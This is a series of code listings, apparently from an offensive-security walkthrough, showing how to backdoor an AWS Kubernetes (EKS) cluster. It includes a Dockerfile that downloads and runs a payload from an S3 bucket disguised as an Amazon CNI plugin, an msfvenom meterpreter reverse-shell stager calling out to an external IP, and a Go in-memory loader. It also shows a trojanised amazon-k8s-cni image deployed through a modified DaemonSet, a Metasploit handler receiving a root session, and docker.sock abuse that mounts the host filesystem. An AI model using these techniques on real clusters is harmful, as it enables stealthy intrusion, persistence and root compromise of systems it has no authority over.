["```\nshell> `./kubectl get nodes â€“sort-by=.metadata.creationTimestamp`\n\nName\nip-192-168-162-15.eu-west-1....   Ready  14 days\nip-192-168-160-34.eu-west-1....   Ready  14 days\nip-192-168-162-87.eu-west-1....   Ready  14 days\nip-192-168-162-95.eu-west-1....   Ready  12 days\nip-192-168-160-125.eu-west-1....  Ready   9 days\n`--snip--`\n```", "```\n#Dockerfile\n\nFROM alpine\n\nCMD [\"/bin/sh\", \"-c\",\n\"wget https://amazon-cni-plugin-essentials.s3.amazonaws.com/run\n-O /root/run && chmod +x /root/run && /root/run\"]\n```", "```\nroot@Point1:~/# **docker run -it phocean/msf ./msfvenom -p \\**\n**linux/x64/meterpreter_reverse_https \\**\n**LHOST=54.229.96.173 \\**\n**LURI=/msf \\**\n**-x /bin/ls**\n**LPORT=443 -f elf > /opt/tmp/stager**\n\n[*] Writing 1046512 bytes to /opt/tmp/stager...\n```", "```\nfunc main() {\n  // Download the encrypted meterpreter payload\n  data, err := getURLContent(path)\n\n  // Decrypt it using XOR operation\n  decryptedData := decryptXor(data, []byte(\"verylongkey\"))\n\n  // Create an anonymous file in memory\n  mfd, err := memfd.Create()\n\n  // Write the decrypted payload to the file\n  mfd.Write(decryptedData)\n\n  // Get the symbolic link to the file\n  filePath := fmt.Sprintf(\"/proc/self/fd/%d\", mfd.Fd())\n\n  // Execute the file\n  cmd := exec.Command(filePath)\n  out, err := cmd.Run()\n}\n```", "```\nroot@Point1:**opt/tmp/# aws s3api put-object \\**\n**--key run \\**\n**--bucket amazon-cni-plugin-essentials \\**\n**--body ./run**\n```", "```\nroot@Point1:~/# **docker build \\**\n**-t 886477354405.dkr.ecr.eu-west-1.amazonaws.com/amazon-k8s-cni:v1.5.3 .**\n\nSuccessfully built be905757d9aa\nSuccessfully tagged 886477354405.dkr.ecr.eu-west-1.amazonaws.com/amazon-k8s-cni:v1.5.3\n\n# Authenticate to ECR\nroot@Point1:~/# **$(aws ecr get-login --no-include-email --region eu-west-1)**\nroot@Point1:~/# **docker push 886477354405.dkr.ecr.eu-west-1.amazonaws.com/amazon-k8s-cni:v1.5.3**\n```", "```\nshell> **kubectl get pods -n kube-system | grep aws-node**\naws-node-rb8n2            1/1     Running   0          7d\naws-node-rs9d1            1/1     Running   0          23h\n`--snip--`\n```", "```\nshell> **kubectl get nodes --show-labels**\n\nip-192-168-178-150.eu-west-1.compute.internal\n\nservice=kafka-broker-collector,\nbeta.kubernetes.io/arch=amd64,\nbeta.kubernetes.io/instance-type=t2.small, beta.kubernetes.io/os=linux\n\nip-192-168-178-150.eu-west-1.compute.internal\n`--snip--`\nip-192-168-178-150.eu-west-1.compute.internal\n`--snip--`\n```", "```\nshell> **kubectl get DaemonSet aws-node -o yaml -n kube-system > aws-ds-manifest.yaml**\n\n# Replace the container image with our own image\nshell> **sed -E \"s/image: .*/image: 886477354405.dkr.ecr.eu-west-1.amazonaws.com/\\**\n**amazon-k8s-cni:v1.5.3/g\" -i aws-ds-manifest.yaml**\n\n# Replace the name of the DaemonSet\nshell> **sed \"s/ name: aws-node/ name: aws-node-cni/g\" -i aws-ds-manifest.yaml**\n\n# Replace the host and container port to avoid conflict\nshell> **sed -E \"s/Port: [0-9]+/Port: 12711/g\" -i aws-ds-manifest.yaml**\n\n# Update the node label key and value\nshell> **sed \"s/ key: beta.kubernetes.io\\/os/ key: service/g\" -i aws-ds-manifest.yaml**\n\nshell> **sed \"s/ linux/ kafka-broker-collector/g\" -i aws-ds-manifest.yaml**\n```", "```\nroot@Point1:~/# **docker ps**\nCONTAINER ID      IMAGE          COMMAND\n8e4adacc6e61      phocean/msf    \"/bin/sh -c \\\"init.sh\\\"\"\n\nroot@Point1:~/# **docker attach 8e4adacc6e61**\nroot@fcd4030:/opt/metasploit-framework# **./msfconsole**\nmsf > **use exploit/multi/handler**\nmsf multi/handler> **set payload linux/x64/meterpreter_reverse_https**\nmsf multi/handler> **set LPORT 443**\nmsf multi/handler> **set LHOST 0.0.0.0**\nmsf multi/handler> **set LURI /msf**\nmsf multi/handler> **set ExitOnSession false**\nmsf multi/handler> **run -j**\n[*] Exploit running as background job 3\n```", "```\nshell> **kubectl -f apply -n kube-system aws-ds-manifest.yaml**\ndaemonset.apps/aws-node-cni created\n\n# Metasploit container\n\n[*] https://0.0.0.0:443 handling request from 34.244.205.187;\nmeterpreter > **getuid**\nServer username: uid=0, gid=0, euid=0, egid=0\n```", "```\napiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: metrics-collect\nspec:\n  schedule: \"0 10 * * *\"\n  jobTemplate:\n spec:\n      template:\n        spec:\n          containers:\n          - name: metrics-collect\n            image: 882347352467.dkr.ecr.eu-west-1.amazonaws.com/amazon-metrics-collector\n            volumeMounts:\n            - mountPath: /var/run/docker.sock\n              name: dockersock\n          volumes:\n          - name: dockersock\n            hostPath:\n              path: /var/run/docker.sock\n          restartPolicy: Never\n```", "```\n# Dockerfile\n\nFROM debian: buster-slim\n\nRUN apt update && apt install -y git make\nRUN apt install -y prometheus-varnish-exporter\nCOPY init.sh /var/run/init.sh\n\nENTRYPOINT [\"/var/run/init.sh\"]\n```", "```\n# Pull the image from the ECR registry\ncurl \\\n  --silent \\\n  --unix-socket /var/run/docker.sock \\\n  \"http://docker/images/create?fromImage=881445392307.dkr.ecr.eu-west\\\n  -1.amazonaws.com/pause-amd64\" \\\n  -X POST\n\n# Create the container from the image and mount the / directory\ncurl \\\n  --silent \\\n  --unix-socket /var/run/docker.sock \\\n  \"http://docker/containers/create?name=pause-go-amd64-4413\" \\\n  -X POST \\\n  -H \"Content-Type: application/json\" \\\n  -d '{ \"Image\": \"881445392307.dkr.ecr.eu-west-1.amazonaws.com/pause-amd64\",\\\n  \"Volumes\": {\"/hostos/\": {}},\"HostConfig\": {\"Binds\": [\"/:/hostos\"]}}'\n\n# Start the container\ncurl \\\n  --silent \\\n  --unix-socket /var/run/docker.sock \\\n  \"http://docker/containers/pause-go-amd64-4413/start\" \\\n  -X POST \\\n  -H \"Content-Type: application/json\" \\\n  --output /dev/null \\\n  --write-out \"%{http_code}\"\n```"]